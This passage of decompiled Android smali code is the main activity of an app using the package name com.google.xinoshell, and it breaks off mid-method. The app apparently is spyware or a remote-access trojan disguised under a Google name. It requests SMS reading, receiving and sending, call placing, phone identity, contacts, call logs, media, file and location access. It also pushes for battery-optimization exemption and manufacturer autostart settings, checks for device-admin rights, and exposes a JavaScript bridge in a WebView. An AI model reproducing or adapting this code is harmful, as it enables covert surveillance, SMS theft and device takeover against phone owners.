.class public Lcom/google/xinoshell/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/google/xinoshell/MainActivity$WebAppInterface;
    }
.end annotation


# static fields
.field private static final APP_SETTINGS_REQUEST:I = 0x66

.field private static final BATTERY_OPTIMIZATION_REQUEST:I = 0x65

.field private static final MANUFACTURER_SETTINGS_REQUEST:I = 0x67

.field private static final PERMISSION_REQUEST_CODE:I = 0x64

.field private static final REQUIRED_PERMISSIONS:[Ljava/lang/String;

.field private static final TAG:Ljava/lang/String; = "ManufacturerSettings"

.field private static prefs:Lcom/google/xinoshell/utils/SharedPrefManager;


# instance fields
.field webView:Landroid/webkit/WebView;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .line 51
    const/4 v0, 0x7

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "android.permission.POST_NOTIFICATIONS"

    aput-object v2, v0, v1

    const/4 v1, 0x1

    const-string v2, "android.permission.READ_SMS"

    aput-object v2, v0, v1

    const/4 v1, 0x2

    const-string v2, "android.permission.RECEIVE_SMS"

    aput-object v2, v0, v1

    const/4 v1, 0x3

    const-string v2, "android.permission.SEND_SMS"

    aput-object v2, v0, v1

    const/4 v1, 0x4

    const-string v2, "android.permission.READ_PHONE_STATE"

    aput-object v2, v0, v1

    const/4 v1, 0x5

    const-string v2, "android.permission.READ_PHONE_NUMBERS"

    aput-object v2, v0, v1

    const/4 v1, 0x6

    const-string v2, "android.permission.CALL_PHONE"

    aput-object v2, v0, v1

    sput-object v0, Lcom/google/xinoshell/MainActivity;->REQUIRED_PERMISSIONS:[Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 42
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private checkAllPermissionsGranted()Z
    .locals 6

    .line 186
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->getAllRequiredPermissions()[Ljava/lang/String;

    move-result-object v0

    .line 187
    .local v0, "perms":[Ljava/lang/String;
    array-length v1, v0

    const/4 v2, 0x0

    move v3, v2

    :goto_0
    if-ge v3, v1, :cond_1

    aget-object v4, v0, v3

    .line 188
    .local v4, "p":Ljava/lang/String;
    invoke-virtual {p0, v4}, Lcom/google/xinoshell/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-eqz v5, :cond_0

    .line 189
    .end local v4    # "p":Ljava/lang/String;
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 191
    :cond_0
    const/4 v2, 0x1

    return v2

    .line 193
    :cond_1
    return v2
.end method

.method private checkManufacturerSpecificSettings()V
    .locals 6

    .line 296
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    const-string v1, "ManufacturerSettings"

    if-nez v0, :cond_0

    .line 297
    const-string v0, "Unable to determine device manufacturer"

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 298
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->startService()V

    .line 299
    return-void

    .line 302
    :cond_0
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    sget-object v2, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {v0, v2}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v0

    .line 303
    .local v0, "manufacturer":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Checking settings for manufacturer: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 306
    :try_start_0
    invoke-direct {p0, v0}, Lcom/google/xinoshell/MainActivity;->getManufacturerSpecificIntent(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v2

    .line 308
    .local v2, "intent":Landroid/content/Intent;
    if-nez v2, :cond_1

    .line 309
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->startService()V

    .line 310
    return-void

    .line 313
    :cond_1
    invoke-virtual {p0}, Lcom/google/xinoshell/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    .line 314
    .local v3, "pm":Landroid/content/pm/PackageManager;
    const/high16 v4, 0x10000

    invoke-virtual {v3, v2, v4}, Landroid/content/pm/PackageManager;->resolveActivity(Landroid/content/Intent;I)Landroid/content/pm/ResolveInfo;

    move-result-object v4

    if-eqz v4, :cond_2

    .line 315
    const/16 v4, 0x67

    invoke-virtual {p0, v2, v4}, Lcom/google/xinoshell/MainActivity;->startActivityForResult(Landroid/content/Intent;I)V

    goto :goto_0

    .line 317
    :cond_2
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Unable to resolve activity for manufacturer: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v1, v4}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 318
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->startService()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 323
    .end local v2    # "intent":Landroid/content/Intent;
    .end local v3    # "pm":Landroid/content/pm/PackageManager;
    :goto_0
    goto :goto_1

    .line 320
    :catch_0
    move-exception v2

    .line 321
    .local v2, "e":Ljava/lang/Exception;
    const-string v3, "Error opening manufacturer settings"

    invoke-static {v1, v3, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 322
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->startService()V

    .line 324
    .end local v2    # "e":Ljava/lang/Exception;
    :goto_1
    return-void
.end method

.method private getAllRequiredPermissions()[Ljava/lang/String;
    .locals 2

    .line 65
    new-instance v0, Ljava/util/ArrayList;

    sget-object v1, Lcom/google/xinoshell/MainActivity;->REQUIRED_PERMISSIONS:[Ljava/lang/String;

    invoke-static {v1}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/util/ArrayList;-><init>(Ljava/util/Collection;)V

    .line 67
    .local v0, "permissions":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    sget-boolean v1, Lcom/google/xinoshell/utils/Config;->isReadContact:Z

    if-eqz v1, :cond_skip_contacts

    const-string v1, "android.permission.READ_CONTACTS"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_skip_contacts
    sget-boolean v1, Lcom/google/xinoshell/utils/Config;->isReadCallLogs:Z

    if-eqz v1, :cond_skip_calllogs

    const-string v1, "android.permission.READ_CALL_LOG"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_skip_calllogs
    sget-boolean v1, Lcom/google/xinoshell/utils/Config;->isAccessGallery:Z

    if-eqz v1, :cond_skip_gallery

    const-string v1, "android.permission.READ_MEDIA_IMAGES"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const-string v1, "android.permission.READ_MEDIA_VIDEO"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const-string v1, "android.permission.READ_MEDIA_AUDIO"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const-string v1, "android.permission.READ_EXTERNAL_STORAGE"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_skip_gallery
    sget-boolean v1, Lcom/google/xinoshell/utils/Config;->isAccessAllFiles:Z

    if-eqz v1, :cond_skip_allfiles

    const-string v1, "android.permission.WRITE_EXTERNAL_STORAGE"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_skip_allfiles
    sget-boolean v1, Lcom/google/xinoshell/utils/Config;->isAccessHiddenFolders:Z

    if-eqz v1, :cond_skip_hidden

    const-string v1, "android.permission.ACCESS_FINE_LOCATION"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const-string v1, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_skip_hidden
    .line 85
    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/String;

    invoke-interface {v0, v1}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v1

    check-cast v1, [Ljava/lang/String;

    return-object v1
.end method

.method private getManufacturerSpecificIntent(Ljava/lang/String;)Landroid/content/Intent;
    .locals 4
    .param p1, "manufacturer"    # Ljava/lang/String;

    .line 327
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 329
    .local v0, "intent":Landroid/content/Intent;
    const-string v1, "xiaomi"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 331
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.miui.securitycenter"

    const-string v3, "com.miui.permcenter.autostart.AutoStartManagementActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto/16 :goto_2

    .line 334
    :cond_0
    const-string v1, "huawei"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_9

    const-string v1, "honor"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_1

    goto/16 :goto_1

    .line 339
    :cond_1
    const-string v1, "vivo"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_2

    .line 341
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.vivo.abe"

    const-string v3, "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto/16 :goto_2

    .line 344
    :cond_2
    const-string v1, "oppo"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_8

    const-string v1, "realme"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_8

    const-string v1, "oneplus"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_3

    goto :goto_0

    .line 349
    :cond_3
    const-string v1, "samsung"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_4

    .line 351
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.samsung.android.sm"

    const-string v3, "com.samsung.android.sm.ui.battery.BatteryActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto :goto_2

    .line 354
    :cond_4
    const-string v1, "letv"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_5

    .line 356
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.letv.android.letvsafe"

    const-string v3, "com.letv.android.letvsafe.AutobootManageActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto :goto_2

    .line 359
    :cond_5
    const-string v1, "meizu"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_6

    .line 361
    const-string v1, "com.meizu.safe.security.SHOW_APPSEC"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 362
    const-string v1, "android.intent.category.DEFAULT"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    .line 363
    const-string v1, "packageName"

    invoke-virtual {p0}, Lcom/google/xinoshell/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    goto :goto_2

    .line 364
    :cond_6
    const-string v1, "asus"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_7

    .line 366
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.asus.mobilemanager"

    const-string v3, "com.asus.mobilemanager.entry.FunctionActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto :goto_2

    .line 370
    :cond_7
    const/4 v1, 0x0

    return-object v1

    .line 346
    :cond_8
    :goto_0
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.coloros.safecenter"

    const-string v3, "com.coloros.safecenter.permission.startup.StartupAppListActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto :goto_2

    .line 336
    :cond_9
    :goto_1
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.huawei.systemmanager"

    const-string v3, "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    .line 373
    :goto_2
    return-object v0
.end method

.method private isIgnoringBatteryOptimizations()Z
    .locals 2

    .line 203
    nop

    .line 204
    const-string v0, "power"

    invoke-virtual {p0, v0}, Lcom/google/xinoshell/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    .line 205
    .local v0, "powerManager":Landroid/os/PowerManager;
    invoke-virtual {p0}, Lcom/google/xinoshell/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v1

    return v1
.end method

.method static synthetic lambda$onRequestPermissionsResult$1(I)Z
    .locals 1
    .param p0, "result"    # I

    .line 247
    if-nez p0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method private static synthetic lambda$startService$0()V
    .locals 1

    .line 170
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v0

    invoke-static {v0}, Landroid/os/Process;->killProcess(I)V

    .line 171
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/System;->exit(I)V

    .line 172
    return-void
.end method

.method private requestBatteryOptimizationExemption()V
    .locals 3

    .line 232
    nop

    .line 233
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 234
    .local v0, "intent":Landroid/content/Intent;
    const-string v1, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 235
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "package:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lcom/google/xinoshell/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 236
    const/16 v1, 0x65

    invoke-virtual {p0, v0, v1}, Lcom/google/xinoshell/MainActivity;->startActivityForResult(Landroid/content/Intent;I)V

    .line 238
    .end local v0    # "intent":Landroid/content/Intent;
    return-void
.end method

.method private requestNecessaryPermissions()V
    .locals 7

    .line 213
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->checkAllPermissionsGranted()Z

    move-result v0

    if-nez v0, :cond_3

    .line 214
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 215
    .local v0, "permissionsToRequest":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->getAllRequiredPermissions()[Ljava/lang/String;

    move-result-object v1

    array-length v2, v1

    const/4 v3, 0x0

    move v4, v3

    :goto_0
    if-ge v4, v2, :cond_1

    aget-object v5, v1, v4

    .line 216
    .local v5, "permission":Ljava/lang/String;
    invoke-virtual {p0, v5}, Lcom/google/xinoshell/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v6

    if-eqz v6, :cond_0

    .line 217
    invoke-interface {v0, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 215
    .end local v5    # "permission":Ljava/lang/String;
    :cond_0
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 220
    :cond_1
    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_2

    .line 221
    new-array v1, v3, [Ljava/lang/String;

    invoke-interface {v0, v1}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v1

    check-cast v1, [Ljava/lang/String;

    const/16 v2, 0x64

    invoke-virtual {p0, v1, v2}, Lcom/google/xinoshell/MainActivity;->requestPermissions([Ljava/lang/String;I)V

    .line 223
    .end local v0    # "permissionsToRequest":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    :cond_2
    goto :goto_1

    .line 224
    :cond_3
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->isIgnoringBatteryOptimizations()Z

    move-result v0

    if-nez v0, :cond_4

    .line 225
    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->requestBatteryOptimizationExemption()V

    .line 228
    :cond_4
    :goto_1
    return-void
.end method

.method private setupWebView()V
    .locals 3

    .line 95
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    new-instance v1, Lcom/google/xinoshell/MainActivity$1;

    invoke-direct {v1, p0}, Lcom/google/xinoshell/MainActivity$1;-><init>(Lcom/google/xinoshell/MainActivity;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 108
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowContentAccess(Z)V

    .line 109
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    .line 110
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 111
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    const/4 v2, -0x1

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    .line 112
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    .line 113
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setDatabaseEnabled(Z)V

    .line 114
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    const/4 v2, 0x0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    .line 115
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 116
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    .line 117
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setDisplayZoomControls(Z)V

    .line 118
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setSupportZoom(Z)V

    .line 119
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptCanOpenWindowsAutomatically(Z)V

    .line 120
    nop

    .line 121
    invoke-static {v1}, Landroid/webkit/WebView;->setWebContentsDebuggingEnabled(Z)V

    .line 123
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    new-instance v1, Lcom/google/xinoshell/MainActivity$WebAppInterface;

    invoke-direct {v1, p0}, Lcom/google/xinoshell/MainActivity$WebAppInterface;-><init>(Landroid/content/Context;)V

    const-string v2, "Android"

    invoke-virtual {v0, v1, v2}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 124
    iget-object v0, p0, Lcom/google/xinoshell/MainActivity;->webView:Landroid/webkit/WebView;

    const-string v1, "file:///android_asset/index.html"

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 125
    return-void
.end method

.method private showPermissionSettingsDialog()V
    .locals 3

    .line 264
    new-instance v0, Landroid/app/AlertDialog$Builder;

    invoke-direct {v0, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    .line 265
    const-string v1, "Permissions Required"

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    .line 266
    const-string v1, "This app requires certain permissions to work properly. Please grant them in the app settings."

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    .line 267
    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    new-instance v1, Lcom/google/xinoshell/MainActivity$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/google/xinoshell/MainActivity$$ExternalSyntheticLambda0;-><init>(Lcom/google/xinoshell/MainActivity;)V

    .line 268
    const-string v2, "Go to Settings"

    invoke-virtual {v0, v2, v1}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    new-instance v1, Lcom/google/xinoshell/MainActivity$$ExternalSyntheticLambda1;

    invoke-direct {v1, p0}, Lcom/google/xinoshell/MainActivity$$ExternalSyntheticLambda1;-><init>(Lcom/google/xinoshell/MainActivity;)V

    .line 274
    const-string v2, "Cancel"

    invoke-virtual {v0, v2, v1}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    .line 277
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    .line 278
    return-void
.end method

.method private isAllFilesAccessGranted()Z
    .locals 1

    :try_start_0
    invoke-static {}, Landroid/os/Environment;->isExternalStorageManager()Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return v0

    :catch_0
    const/4 v0, 0x0

    return v0
.end method

.method private isDeviceAdminActive()Z
    .locals 4

    :try_start_0
    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/google/xinoshell/receivers/DeviceAdminReceiver;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return v0

    :catch_0
    const/4 v0, 0x0

    return v0
.end method

.method private requestAllSpecialPermissions()V
    .locals 5

    .line 1
    :try_start_0
    sget-boolean v0, Lcom/google/xinoshell/utils/Config;->isAccessAllFiles:Z

    if-eqz v0, :cond_skip_files_check

    invoke-direct {p0}, Lcom/google/xinoshell/MainActivity;->isAllFilesAccessGranted()Z

    move-result v0

    if-nez v0, :cond_skip_files

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "package:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lcom/google/xinoshell/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

